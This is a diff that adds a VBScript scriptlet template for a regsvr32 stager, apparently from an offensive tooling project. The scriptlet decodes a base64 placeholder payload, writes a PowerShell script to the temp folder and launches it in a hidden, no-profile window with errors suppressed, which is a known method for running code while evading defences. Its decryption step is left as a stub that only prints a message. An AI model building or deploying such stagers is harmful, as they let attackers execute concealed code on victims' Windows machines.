@@ -1,0 +1,27 @@
+<!-- stagers/regsvr32/template.sct -->
+<job id="Payload">
+  <script language="VBScript">
+  <![CDATA[
+    On Error Resume Next
+
+    payload = "REPLACE_AES" ' Format: ivhex:base64
+    parts = Split(payload, ":")
+    ivHex = parts(0)
+    b64 = parts(1)
+
+    Set xml = CreateObject("Msxml2.DOMDocument.3.0")
+    Set node = xml.CreateElement("base64")
+    node.DataType = "bin.base64"
+    node.Text = b64
+    cipher = node.NodeTypedValue
+
+    temp = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\" & Rnd() & ".ps1"
+    Set file = CreateObject("Scripting.FileSystemObject").CreateTextFile(temp, True)
+    file.WriteLine "Write-Output '[!] AES decryption should be implemented in-memory.'"
+    file.Close
+
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "powershell -nop -w hidden -c "". """ & temp & """"", 0, False
+  ]]>
+  </script>
+</job>
